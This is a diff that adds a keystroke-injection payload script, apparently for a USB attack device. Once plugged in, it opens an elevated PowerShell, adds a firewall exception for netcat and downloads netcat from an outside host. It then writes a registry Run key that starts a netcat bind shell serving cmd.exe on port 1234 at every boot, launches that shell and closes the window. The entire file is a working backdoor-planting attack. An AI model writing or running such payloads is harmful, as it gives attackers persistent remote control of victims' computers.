@@ -1,0 +1,30 @@
+DELAY 3000
+REM --> Open powershell
+WINDOWS x
+DELAY 100
+STRING a
+ENTER
+DELAY 900
+ALT y
+DELAY 400
+REM allow nc through firewall
+STRING netsh advfirewall firewall add rule name="nc" dir=in action=allow program="C:\Windows\System32\tmp\nc111nt\nc.exe"
+ENTER
+DELAY 400
+REM download nc
+STRING Invoke-WebRequest -uri http://jefruv.com/tmp/tmp.zip -OutFile nc.zip
+ENTER
+DELAY 800
+STRING expand-archive -path nc.zip -DestinationPath .\tmp
+ENTER
+DELAY 800
+STRING cd tmp/nc111nt
+ENTER
+DELAY 600
+STRING reg add "HKLM\software\microsoft\windows\currentversion\run" /f /v "system" /t REG_SZ /d "C:\windows\system32\tmp\nc111nt\nc.exe -dl -p 1234 -e cmd.exe"
+ENTER
+DELAY 600
+STRING ./nc -dl -p 1234 -e cmd.exe
+ENTER
+DELAY 300
+ALT F4
